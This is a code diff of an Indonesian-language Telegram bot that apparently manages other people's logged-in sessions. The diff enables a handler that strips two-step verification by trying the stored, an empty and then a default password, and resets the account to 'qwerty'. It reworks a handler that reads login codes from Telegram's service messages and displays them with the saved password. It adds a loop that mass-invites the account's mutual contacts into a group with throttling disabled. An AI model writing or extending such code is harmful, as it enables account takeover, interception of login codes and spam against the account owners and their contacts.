+            #                 # Update progress setiap 5 kontak atau kontak terakhir
+            #                 if i % 5 == 0 or i == len(contacts_to_invite) - 1:
+            #                     await status_msg.edit(
+            #                         f"🔄 Proses undangan...\n\n"
+            #                         f"⏳ Progress: {i+1}/{total_contacts}\n"
+            #                         f"✔ Berhasil: {success} | ✖ Gagal: {failures}\n"
+            #                         f"📌 Sedang memproses: {getattr(contact, 'first_name', '')} {getattr(contact, 'last_name', '')}"
+            #                     )
 
-                            if is_supergroup:
-                                await client(functions.channels.InviteToChannelRequest(
-                                    channel=input_peer,
-                                    users=[contact]
-                                ))
-                            else:
-                                await client(functions.messages.AddChatUserRequest(
-                                    chat_id=group.id,
-                                    user_id=contact,
-                                    fwd_limit=100
-                                ))
+            #                 if is_supergroup:
+            #                     await client(functions.channels.InviteToChannelRequest(
+            #                         channel=input_peer,
+            #                         users=[contact]
+            #                     ))
+            #                 else:
+            #                     await client(functions.messages.AddChatUserRequest(
+            #                         chat_id=group.id,
+            #                         user_id=contact,
+            #                         fwd_limit=100
+            #                     ))
 
-                            success += 1
-                            #await asyncio.sleep(0.1)  # Delay untuk menghindari flood
+            #                 success += 1
+            #                 #await asyncio.sleep(0.1)  # Delay untuk menghindari flood
 
-                        except errors.UserAlreadyParticipantError:
-                            failures += 1
-                        except errors.PeerFloodError:
-                            await client.send_message("⚠️ Terlalu banyak mencoba! Coba lagi nanti (Akunnya kena limit undang kontak bang).")
-                            break
-                        except Exception as e:
-                            failures += 1
-                            print(f"Error inviting {contact.id}: {str(e)}")
+            #             except errors.UserAlreadyParticipantError:
+            #                 failures += 1
+            #             except errors.PeerFloodError:
+            #                 await client.send_message("⚠️ Terlalu banyak mencoba! Coba lagi nanti (Akunnya kena limit undang kontak bang).")
+            #                 break
+            #             except Exception as e:
+            #                 failures += 1
+            #                 print(f"Error inviting {contact.id}: {str(e)}")
 
-                    # Hasil akhir
-                    result_message = (
-                        f"🎉 **PROSES SELESAI**\n\n"
-                        f"📊 Hasil Undangan:\n"
-                        f"• Total kontak mutual: {total_contacts}\n"
-                        f"• Berhasil diundang: {success}\n"
-                        f"• Gagal : {failures}\n\n"
-                        f"⏰ Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                    )
+            #         # Hasil akhir
+            #         result_message = (
+            #             f"🎉 **PROSES SELESAI**\n\n"
+            #             f"📊 Hasil Undangan:\n"
+            #             f"• Total kontak mutual: {total_contacts}\n"
+            #             f"• Berhasil diundang: {success}\n"
+            #             f"• Gagal : {failures}\n\n"
+            #             f"⏰ Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            #         )
 
-                    await status_msg.edit(result_message)
+            #         await status_msg.edit(result_message)
 
-                except Exception as e:
-                    await status_msg.edit(f"⚠️ ERROR: {str(e)}")
-                finally:
-                    try:
-                        if client and client.is_connected():
-                            await client.disconnect()
-                    except:
-                        pass
+            #     except Exception as e:
+            #         await status_msg.edit(f"⚠️ ERROR: {str(e)}")
+            #     finally:
+            #         try:
+            #             if client and client.is_connected():
+            #                 await client.disconnect()
+            #         except:
+            #             pass
                     
-                    if SENDER in invite_state:
-                        del invite_state[SENDER]
+            #         if SENDER in invite_state:
+            #             del invite_state[SENDER]
 
 @bot.on(events.CallbackQuery())
 async def callback_handler(event):
@@ -1174,6 +1306,210 @@ async def callback_handler(event):
             buttons=buttons
         )
 
+    elif SENDER in invite_state and invite_state[SENDER].get('step') == 'awaiting_group_link':
+        state = invite_state[SENDER]
+        group_link = text.strip()
+    
+        if not group_link.startswith(('https://t.me/', 't.me/')):
+            await event.respond("⚠ Format link tidak valid! Harus berupa link Telegram (contoh: `https://t.me/namagrup`)")
+            return
+    
+        # Simpan link grup dan lanjutkan ke proses undangan
+        invite_state[SENDER]['group_link'] = group_link
+        invite_state[SENDER]['step'] = 'processing'
+    
+        days = state['filter_days']
+        filter_name = {
+            0: "SEMUA KONTAK MUTUAL",
+            1: "1 Hari Terakhir",
+            3: "3 Hari Terakhir",
+            7: "7 Hari Terakhir",
+            30: "30 Hari Terakhir"
+        }.get(days, "SEMUA KONTAK MUTUAL")
+    
+        # Kirim pesan status awal
+        status_msg = await event.respond(
+            f"🔄 Memulai proses undangan...\n"
+            f"• Filter: {filter_name}\n"
+            f"• Grup Tujuan: {group_link}\n"
+            f"• Hanya kontak mutual (saling save)\n\n"
+            f"⏳ Mohon tunggu..."
+        )
+    
+        client = TelegramClient(f"{path}sessions/users/{state['phone']}", api_id, api_hash)
+        await client.connect()
+    
+        try:
+            # Fungsi untuk mendapatkan entitas grup
+            async def get_group_entity():
+                try:
+                    if group_link.startswith('https://t.me/+') or group_link.startswith('https://t.me/joinchat/'):
+                        hash_part = group_link.split('/')[-1]
+                        if hash_part.startswith('+'): 
+                            hash_part = hash_part[1:]
+    
+                        try:
+                            await client(functions.messages.ImportChatInviteRequest(hash=hash_part))
+                            await asyncio.sleep(3)
+                            dialogs = await client.get_dialogs()
+                            for dialog in dialogs:
+                                if dialog.is_group or dialog.is_channel:
+                                    if hasattr(dialog.entity, 'id'):
+                                        return dialog.entity
+                        except errors.UserAlreadyParticipantError:
+                            dialogs = await client.get_dialogs()
+                            for dialog in dialogs:
+                                if dialog.is_group or dialog.is_channel:
+                                    if hasattr(dialog.entity, 'id'):
+                                        return dialog.entity
+                    else:
+                        group_username = group_link.split('/')[-1]
+                        return await client.get_entity(group_username)
+                except Exception as e:
+                    print(f"Error in get_group_entity: {str(e)}")
+                    return None
+    
+            group = await get_group_entity()
+            if not group:
+                await status_msg.edit("⚠️ Tidak dapat mengakses grup. coba lagi.")
+                return
+    
+            if isinstance(group, types.Chat):
+                input_peer = types.InputPeerChat(chat_id=group.id)
+                is_supergroup = False
+            elif isinstance(group, (types.Channel, types.ChatForbidden)):
+                input_peer = types.InputPeerChannel(
+                    channel_id=group.id,
+                    access_hash=group.access_hash
+                )
+                is_supergroup = True
+            else:
+                await status_msg.edit("⚠️ Jenis grup tidak didukung")
+                return
+    
+            # Get contacts dengan filter mutual yang ketat (hanya yang saling save)
+            contacts_result = await client(functions.contacts.GetContactsRequest(hash=0))
+            all_contacts = contacts_result.users
+    
+            await status_msg.edit("🔍 Mencari kontak mutual (saling save)...")
+    
+            # Filter ketat: hanya kontak yang benar-benar mutual (saling save)
+            mutual_contacts = [
+                contact for contact in all_contacts 
+                if getattr(contact, 'mutual_contact', False)
+            ]
+    
+            if not mutual_contacts:
+                await status_msg.edit("⚠️ Tidak ditemukan kontak mutual (saling save)")
+                return
+    
+            # Filter berdasarkan last seen jika diperlukan
+            if days > 0:
+                await status_msg.edit(f"🔍 Memfilter {len(mutual_contacts)} kontak mutual yang aktif {days} hari terakhir...")
+                max_last_seen = time.time() - (days * 24 * 60 * 60)
+                filtered_contacts = []
+    
+                for contact in mutual_contacts:
+                    if not hasattr(contact, 'status'):
+                        continue
+                    
+                    if isinstance(contact.status, types.UserStatusOnline):
+                        filtered_contacts.append(contact)
+                    elif isinstance(contact.status, types.UserStatusRecently) and days >= 3:
+                        filtered_contacts.append(contact)
+                    elif isinstance(contact.status, types.UserStatusLastWeek) and days >= 7:
+                        filtered_contacts.append(contact)
+                    elif isinstance(contact.status, types.UserStatusOffline) and hasattr(contact.status, 'was_online'):
+                        try:
+                            if contact.status.was_online.timestamp() >= max_last_seen:
+                                filtered_contacts.append(contact)
+                        except:
+                            pass
+                            
+                contacts_to_invite = filtered_contacts
+            else:
+                contacts_to_invite = mutual_contacts
+    
+            if not contacts_to_invite:
+                await status_msg.edit(f"⚠️ Tidak ada kontak mutual yang aktif dalam {days} hari terakhir")
+                return
+    
+            total_contacts = len(contacts_to_invite)
+            success = 0
+            failures = 0
+    
+            await status_msg.edit(
+                f"✅ Ditemukan {total_contacts} kontak mutual\n"
+                f"🔄 Memulai undangan ke grup...\n\n"
+                f"⏳ Progress: 0/{total_contacts}\n"
+                f"✔ Berhasil: 0 | ✖ Gagal: 0"
+            )
+    
+            for i, contact in enumerate(contacts_to_invite):
+                try:
+                    # Update progress setiap 5 kontak atau kontak terakhir
+                    if i % 5 == 0 or i == len(contacts_to_invite) - 1:
+                        await status_msg.edit(
+                            f"🔄 Proses undangan...\n\n"
+                            f"⏳ Progress: {i+1}/{total_contacts}\n"
+                            f"✔ Berhasil: {success} | ✖ Gagal: {failures}\n"
+                            f"📌 Sedang memproses: {getattr(contact, 'first_name', '')} {getattr(contact, 'last_name', '')}"
+                        )
+    
+                    if is_supergroup:
+                        await client(functions.channels.InviteToChannelRequest(
+                            channel=input_peer,
+                            users=[contact]
+                        ))
+                    else:
+                        await client(functions.messages.AddChatUserRequest(
+                            chat_id=group.id,
+                            user_id=contact,
+                            fwd_limit=100
+                        ))
+    
+                    success += 1
+                    #await asyncio.sleep(0.1)  # Delay untuk menghindari flood
+    
+                except errors.UserAlreadyParticipantError:
+                    failures += 1
+                except errors.PeerFloodError:
+                    await client.send_message("⚠️ Terlalu banyak mencoba! Coba lagi nanti (Akunnya kena limit undang kontak bang).")
+                    break
+                except Exception as e:
+                    failures += 1
+                    print(f"Error inviting {contact.id}: {str(e)}")
+    
+            # Hasil akhir
+            result_message = (
+                f"🎉 **PROSES SELESAI**\n\n"
+                f"📊 Hasil Undangan:\n"
+                f"• Total kontak mutual: {total_contacts}\n"
+                f"• Berhasil diundang: {success}\n"
+                f"• Gagal : {failures}\n\n"
+                f"⏰ Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            )
+    
+            await status_msg.edit(result_message)
+    
+        except Exception as e:
+            await status_msg.edit(f"⚠️ ERROR: {str(e)}")
+        finally:
+            try:
+                if client and client.is_connected():
+                    await client.disconnect()
+            except:
+                pass
+            
+            if SENDER in invite_state:
+                del invite_state[SENDER]
+    
+            await event.edit(
+                "📅 **PILIH FILTER KONTAK MUTUAL YANG AKAN DIUNDANG:**\n"
+                "_(Hanya kontak yang saling save/saling kontak saja yang akan diundang)_",
+                buttons=buttons
+            )
+
 
     elif callback_data.startswith("deleteAllContacts-"):
         phonenumber = callback_data.split("-")[1]
@@ -1292,16 +1628,16 @@ async def callback_handler(event):
                 if no_hpx in users: users.pop(no_hpx)
                 await event.edit(f"AKUN `{no_hpx}` TELAH DIHAPUS DARI DATA")
             
-            # elif callback_data.startswith("disable2fa-"):
-            #     phonenumber = callback_data.split("-")[1]
-            #     client = None
-            #     try:
-            #         # 1. Initialize client (removed unsupported parameters)
-            #         client = TelegramClient(
-            #             f"{path}sessions/users/{phonenumber}",
-            #             api_id,
-            #             api_hash
-            #         )
+            elif callback_data.startswith("disable2fa-"):
+                phonenumber = callback_data.split("-")[1]
+                client = None
+                try:
+                    # 1. Initialize client (removed unsupported parameters)
+                    client = TelegramClient(
+                        f"{path}sessions/users/{phonenumber}",
+                        api_id,
+                        api_hash
+                    )
 
                     # 2. Connect with retry mechanism (without timeout parameter)
                     # for retry_count in range(3):
@@ -1316,85 +1652,85 @@ async def callback_handler(event):
                     #             await client.disconnect()
                             
                     # 3. Get user data and password info
-                #     users = readJSON(fUsers)
-                #     saved_password = users[phonenumber].get('password', '')
-                #     pwd = await client(functions.account.GetPasswordRequest())
+                    users = readJSON(fUsers)
+                    saved_password = users[phonenumber].get('password', '')
+                    pwd = await client(functions.account.GetPasswordRequest())
 
-                #     # 4. Enhanced disable attempts
-                #     attempts = [
-                #         {"method": "saved_password", "password": saved_password, "message": "menggunakan password tersimpan"},
-                #         {"method": "empty_password", "password": None, "message": "tanpa password"},
-                #         {"method": "default_password", "password": "qwerty", "message": "reset ke password default"}
-                #     ]
+                    # 4. Enhanced disable attempts
+                    attempts = [
+                        {"method": "saved_password", "password": saved_password, "message": "menggunakan password tersimpan"},
+                        {"method": "empty_password", "password": None, "message": "tanpa password"},
+                        {"method": "default_password", "password": "qwerty", "message": "reset ke password default"}
+                    ]
 
-                #     for attempt in attempts:
-                #         try:
-                #             if attempt["method"] == "saved_password" and attempt["password"]:
-                #                 await client(functions.account.UpdatePasswordSettingsRequest(
-                #                     password=await client._compute_input_password(pwd, attempt["password"]),
-                #                     new_settings=types.account.PasswordInputSettings(
-                #                         new_algo=None,
-                #                         new_password_hash=None,
-                #                         hint="",
-                #                         email=None,
-                #                         new_secure_settings=None
-                #                     )
-                #                 ))
-                #             elif attempt["method"] == "empty_password":
-                #                 await client(functions.account.UpdatePasswordSettingsRequest(
-                #                     password=InputCheckPasswordEmpty(),
-                #                     new_settings=types.account.PasswordInputSettings(
-                #                         new_algo=None,
-                #                         new_password_hash=None,
-                #                         hint="",
-                #                         email=None,
-                #                         new_secure_settings=None
-                #                     )
-                #                 ))
-                #             else:
-                #                 await client(functions.account.UpdatePasswordSettingsRequest(
-                #                     password=InputCheckPasswordEmpty(),
-                #                     new_settings=types.account.PasswordInputSettings(
-                #                         new_algo=pwd.new_algo,
-                #                         new_password_hash=hashlib.pbkdf2_hmac(
-                #                             'sha512', 
-                #                             b'qwerty', 
-                #                             pwd.new_salt, 
-                #                             100000
-                #                         )[:32],
-                #                         hint="qwerty",
-                #                         email=None,
-                #                         new_secure_settings=None
-                #                     )
-                #                 ))
+                    for attempt in attempts:
+                        try:
+                            if attempt["method"] == "saved_password" and attempt["password"]:
+                                await client(functions.account.UpdatePasswordSettingsRequest(
+                                    password=await client._compute_input_password(pwd, attempt["password"]),
+                                    new_settings=types.account.PasswordInputSettings(
+                                        new_algo=None,
+                                        new_password_hash=None,
+                                        hint="",
+                                        email=None,
+                                        new_secure_settings=None
+                                    )
+                                ))
+                            elif attempt["method"] == "empty_password":
+                                await client(functions.account.UpdatePasswordSettingsRequest(
+                                    password=InputCheckPasswordEmpty(),
+                                    new_settings=types.account.PasswordInputSettings(
+                                        new_algo=None,
+                                        new_password_hash=None,
+                                        hint="",
+                                        email=None,
+                                        new_secure_settings=None
+                                    )
+                                ))
+                            else:
+                                await client(functions.account.UpdatePasswordSettingsRequest(
+                                    password=InputCheckPasswordEmpty(),
+                                    new_settings=types.account.PasswordInputSettings(
+                                        new_algo=pwd.new_algo,
+                                        new_password_hash=hashlib.pbkdf2_hmac(
+                                            'sha512', 
+                                            b'qwerty', 
+                                            pwd.new_salt, 
+                                            100000
+                                        )[:32],
+                                        hint="qwerty",
+                                        email=None,
+                                        new_secure_settings=None
+                                    )
+                                ))
 
-                #             users[phonenumber]['password'] = ""
-                #             saveJSON(fUsers, users)
-                #             await event.answer(f"✅ 2FA berhasil dinonaktifkan ({attempt['message']})", alert=True)
-                #             await event.edit(f"{message.text}\n\n**2FA Status:** Disabled", buttons=btnSpecificUsers(phonenumber))
-                #             break
+                            users[phonenumber]['password'] = ""
+                            saveJSON(fUsers, users)
+                            await event.answer(f"✅ 2FA berhasil dinonaktifkan ({attempt['message']})", alert=True)
+                            await event.edit(f"{message.text}\n\n**2FA Status:** Disabled", buttons=btnSpecificUsers(phonenumber))
+                            break
 
-                #         except Exception as e:
-                #             if attempt == attempts[-1]:
-                #                 error_msg = str(e)
-                #                 if "SRP_" in error_msg:
-                #                     await event.answer("⚠️ Error enkripsi. Coba login ulang session.", alert=True)
-                #                 elif "database is locked" in error_msg:
-                #                     await event.answer("⚠️ Database masih terkunci. Coba lagi nanti.", alert=True)
-                #                 else:
-                #                     await event.answer(f"⚠️ Gagal menonaktifkan 2FA: {error_msg}", alert=True)
-                #             await asyncio.sleep(1)
-                #             await client.disconnect()
+                        except Exception as e:
+                            if attempt == attempts[-1]:
+                                error_msg = str(e)
+                                if "SRP_" in error_msg:
+                                    await event.answer("⚠️ Error enkripsi. Coba login ulang session.", alert=True)
+                                elif "database is locked" in error_msg:
+                                    await event.answer("⚠️ Database masih terkunci. Coba lagi nanti.", alert=True)
+                                else:
+                                    await event.answer(f"⚠️ Gagal menonaktifkan 2FA: {error_msg}", alert=True)
+                            await asyncio.sleep(1)
+                            await client.disconnect()
 
-                # except Exception as e:
-                #     await event.answer(f"⚠️ Error sistem: {str(e)}", alert=True)
-                # finally:
-                #     if client:
-                #         try:
-                #             await client.disconnect()
-                #             await asyncio.sleep(0.5)
-                #         except:
-                #             pass
+                except Exception as e:
+                    await event.answer(f"⚠️ Error sistem: {str(e)}", alert=True)
+                finally:
+                    if client:
+                        try:
+                            await client.disconnect()
+                            await asyncio.sleep(0.5)
+                        except:
+                            pass
             
             elif callback_data.startswith("broadcast-"):
                 broadcast_state[event.sender_id] = {'phone': phonenumber}
@@ -1405,30 +1741,17 @@ async def callback_handler(event):
                 try:
                     if callback_data.startswith("accountInfo-"):
                         phonenumber = callback_data.split("-", 1)[1]
-                        client = None  # Inisialisasi dengan None
-                        
+                        client = None  # Deklarasikan di sini untuk memastikan variabel ada di blok finally
                         try:
-                            # Baca file users
-                            try:
-                                with open(fUsers, 'r') as f:
-                                    users_data = json.load(f)
-                            except (FileNotFoundError, json.JSONDecodeError) as e:
-                                print(f"Error reading users file: {e}")
-                                await event.respond(
-                                    "❌ Terjadi kesalahan saat membaca data pengguna!",
-                                    buttons=Button.inline("< Kembali ke Menu", "main_menu")
-                                )
-                                return False
-                
+                            with open(fUsers, 'r') as f:
+                                users_data = json.load(f)
+                    
                             if phonenumber not in users_data:
                                 await event.respond("❌ Nomor Sudah terhapus atau sudah tidak terdaftar bosku")
                                 return False
-                
-                            # Gunakan client baru daripada acd global
-                            client = TelegramClient(f"{path}sessions/users/{phonenumber}", api_id, api_hash)
-                            await client.connect()
-                            
-                            if not await client.is_user_authorized():
+                    
+                            client = acd  # Assign client di sini
+                            if not client.is_connected() or not await client.is_user_authorized():
                                 await event.respond(
                                     "⚠️ Akun sudah logout bosku, klik tombol dibawah agar menghapus nomor ini",
                                     buttons=[
@@ -1436,166 +1759,90 @@ async def callback_handler(event):
                                     ]
                                 )
                                 return False
-                
+                    
                             await event.respond(
                                 f"{getSpecificUsers(phonenumber)}\n\n🧑‍💻̲𝘋̲𝘦​̲𝘷​̲𝘦​̲𝘭​̲𝘰​̲𝘱​̲𝘦​̲𝘳​̲ ​̲:​̲ ​̲@mulaikosi",
                                 buttons=btnSpecificUsers(phonenumber)
                             )
-                
-                        except Exception as e:
-                            print(f"Error in accountInfo: {e}")
-                            await event.respond("❌ Terjadi kesalahan saat memproses permintaan!")
+                        except (FileNotFoundError, json.JSONDecodeError):
+                            print(f"Error reading users file")
+                            await event.respond(
+                                "❌ Terjadi kesalahan saat membaca data pengguna!",
+                                buttons=Button.inline("< Kembali ke Menu", "main_menu")
+                            )
                             return False
-                            
+                        except Exception as e:
+                            print(e)
+                            return False
                         finally:
-                            try:
-                                if client and client.is_connected():
-                                    await client.disconnect()
-                            except Exception as e:
-                                print(f"Error disconnecting client: {e}")
+                            if client and client.is_connected():
+                                await client.disconnect()  # Pastikan koneksi ditutup
 
 
                     elif callback_data.startswith("readcode-"):
-                        client = None  # Inisialisasi client
-                        try:
-                            phonenumber = callback_data.split("-", 1)[1]
-                            
-                            # Buat client baru khusus untuk operasi ini
-                            client = TelegramClient(
-                                f"{path}sessions/users/{phonenumber}", 
-                                api_id, 
-                                api_hash,
-                            )
-                            
-                            # Connect dengan timeout
-                            await asyncio.wait_for(client.connect(), timeout=15.0)
-                            
-                            if not await client.is_user_authorized():
+                        msg = await acd.get_messages(777000, limit=100)
+                        for messe in msg:
+                            OTPCODE = re.search(r'\b(\d{5})\b', messe.text)
+                            if OTPCODE:
+                                user_info = users[phonenumber]
+                                phone_number = phonenumber
+                                name = user_info['name']
+                                username = f"@{user_info['username']}" if user_info['username'] else "None"
+                                password = user_info.get('password')
+                                user_id = user_info['user_id']
+
+                                # Get contacts and calculate mutual status
+                                contacts_result = await acd(GetContactsRequest(hash=0))
+                                all_contacts = contacts_result.users
+                                mutual_contacts = 0
+                                non_mutual_contacts = 0
+
+                                for contact in all_contacts:
+                                    if contact.mutual_contact:
+                                        mutual_contacts += 1
+                                    else:
+                                        non_mutual_contacts += 1
+
+                                # Get groups and channels count
+                                dialogs = await acd.get_dialogs()
+                                groups_count = 0
+                                channels_count = 0
+
+                                for dialog in dialogs:
+                                    entity = dialog.entity
+                                    if hasattr(entity, 'megagroup') and entity.megagroup:
+                                        groups_count += 1
+                                    elif hasattr(entity, 'broadcast') and entity.broadcast:
+                                        channels_count += 1
+
+                                password_text = f"**Password :** `{password}`\n" if password else ""
+
+                                BTX = [
+                                    [Button.inline("REFRESH 🔄", f"readcode-{phonenumber}")],
+                                    [Button.inline("< Kembali", f"accountInfo-{phonenumber}"), btn_delete]
+                                ]
                                 await event.edit(
-                                    "⚠️ Sesi telah logout!",
-                                    buttons=[Button.inline("< Kembali", f"accountInfo-{phonenumber}")]
+                                    f"📱**Nomor Telepon :** `{phone_number}`\n"
+                                    f"🔑**Kode Masuk Anda :** `{OTPCODE.group(0)}`\n"
+                                    f"🔒 {password_text}"
+                                    f"📅**Kode Diterima :** {messe.date} (UTC)\n\n"
+                                    f"👥**Informasi Kontak:**\n"
+                                    f"🤝 **Mutual:** `{mutual_contacts}` kontak\n"
+                                    f"🚫 **Non-Mutual:** `{non_mutual_contacts}` kontak\n"
+                                    f"📊 **Total:** `{len(all_contacts)}` kontak\n\n"
+                                    f"👥**Informasi Grup & Channel:**\n"
+                                    f"👥 **Grup:** `{groups_count}` grup\n"
+                                    f"📢 **Channel:** `{channels_count}` channel\n"
+                                    f"📊 **Total:** `{groups_count + channels_count}` grup & channel\n\n"
+                                    f"👤**Informasi Pengguna:**\n"
+                                    f"👤**Nama :** {name}\n"
+                                    f"📛**Username :** {username}\n"
+                                    f"🆔**User ID :** `{user_id}`\n\n"
+                                    f"🕒**Updated :** {todate(time.time())}\n\n"
+                                    f"💻**Developer :** @mulaikosi",
+                                    buttons=BTX
                                 )
-                                return
-                    
-                            # Ambil pesan OTP dengan error handling
-                            try:
-                                msg = await asyncio.wait_for(
-                                    client.get_messages(777000, limit=100),
-                                    timeout=30.0
-                                )
-                            except Exception as e:
-                                await event.edit(
-                                    f"⚠️ Gagal membaca pesan: {str(e)}",
-                                    buttons=[Button.inline("Coba Lagi", f"readcode-{phonenumber}")]
-                                )
-                                return
-                    
-                            # Proses pesan OTP
-                            processed = False
-                            for messe in msg:
-                                try:
-                                    OTPCODE = re.search(r'\b(\d{5})\b', messe.text)
-                                    if OTPCODE:
-                                        user_info = users.get(phonenumber, {})
-                                        
-                                        # Data fallback jika tidak ada di users
-                                        phone_number = phonenumber
-                                        name = user_info.get('name', 'Tidak diketahui')
-                                        username = f"@{user_info['username']}" if user_info.get('username') else "None"
-                                        password = user_info.get('password')
-                                        user_id = user_info.get('user_id', 'Tidak diketahui')
-                    
-                                        # Hitung kontak mutual dengan timeout
-                                        try:
-                                            contacts_result = await asyncio.wait_for(
-                                                client(GetContactsRequest(hash=0)),
-                                                timeout=20.0
-                                            )
-                                            all_contacts = contacts_result.users
-                                            mutual_contacts = sum(1 for contact in all_contacts if getattr(contact, 'mutual_contact', False))
-                                            non_mutual_contacts = len(all_contacts) - mutual_contacts
-                                        except Exception as e:
-                                            mutual_contacts = non_mutual_contacts = "Error"
-                                            all_contacts = []
-                    
-                                        # Hitung grup dan channel dengan timeout
-                                        groups_count = channels_count = 0
-                                        try:
-                                            dialogs = await asyncio.wait_for(
-                                                client.get_dialogs(),
-                                                timeout=20.0
-                                            )
-                                            for dialog in dialogs:
-                                                entity = dialog.entity
-                                                if hasattr(entity, 'megagroup') and entity.megagroup:
-                                                    groups_count += 1
-                                                elif hasattr(entity, 'broadcast') and entity.broadcast:
-                                                    channels_count += 1
-                                        except Exception as e:
-                                            groups_count = channels_count = "Error"
-                    
-                                        password_text = f"**Password :** `{password}`\n" if password else ""
-                    
-                                        BTX = [
-                                            [Button.inline("REFRESH 🔄", f"readcode-{phonenumber}")],
-                                            [Button.inline("< Kembali", f"accountInfo-{phonenumber}"), btn_delete]
-                                        ]
-                    
-                                        await event.edit(
-                                            f"📱**Nomor Telepon :** `{phone_number}`\n"
-                                            f"🔑**Kode Masuk Anda :** `{OTPCODE.group(0)}`\n"
-                                            f"🔒 {password_text}"
-                                            f"📅**Kode Diterima :** {messe.date} (UTC)\n\n"
-                                            f"👥**Informasi Kontak:**\n"
-                                            f"🤝 **Mutual:** `{mutual_contacts}` kontak\n"
-                                            f"🚫 **Non-Mutual:** `{non_mutual_contacts}` kontak\n"
-                                            f"📊 **Total:** `{len(all_contacts)}` kontak\n\n"
-                                            f"👥**Informasi Grup & Channel:**\n"
-                                            f"👥 **Grup:** `{groups_count}` grup\n"
-                                            f"📢 **Channel:** `{channels_count}` channel\n"
-                                            f"📊 **Total:** `{groups_count + channels_count if isinstance(groups_count, int) else 'Error'}`\n\n"
-                                            f"👤**Informasi Pengguna:**\n"
-                                            f"👤**Nama :** {name}\n"
-                                            f"📛**Username :** {username}\n"
-                                            f"🆔**User ID :** `{user_id}`\n\n"
-                                            f"🕒**Updated :** {todate(time.time())}\n\n"
-                                            f"💻**Developer :** @mulaikosi",
-                                            buttons=BTX
-                                        )
-                                        processed = True
-                                        break
-                                        
-                                except Exception as e:
-                                    print(f"Error processing message: {str(e)}")
-                                    continue
-                                
-                            if not processed:
-                                await event.edit(
-                                    "⚠️ Tidak ditemukan kode OTP dalam 100 pesan terakhir",
-                                    buttons=[Button.inline("Coba Lagi", f"readcode-{phonenumber}")]
-                                )
-                    
-                        except asyncio.TimeoutError:
-                            await event.edit(
-                                "⚠️ Timeout saat memproses permintaan",
-                                buttons=[Button.inline("Coba Lagi", f"readcode-{phonenumber}")]
-                            )
-                        except KeyError:
-                            await event.edit(
-                                "⚠️ Data pengguna tidak ditemukan",
-                                buttons=[Button.inline("< Kembali ke Menu", "main_menu")]
-                            )
-                        except Exception as e:
-                            await event.edit(
-                                f"⚠️ Error: {str(e)}",
-                                buttons=[Button.inline("< Kembali", "main_menu")]
-                            )
-                        finally:
-                            try:
-                                if client and client.is_connected():
-                                    await client.disconnect()
-                            except Exception as e:
-                                print(f"Error disconnecting client: {str(e)}")
+                                break
 
                     elif callback_data.startswith("selectsessionhash-"):
                         gsplit = callback_data.replace(f"selectsessionhash-{phonenumber}-", "")
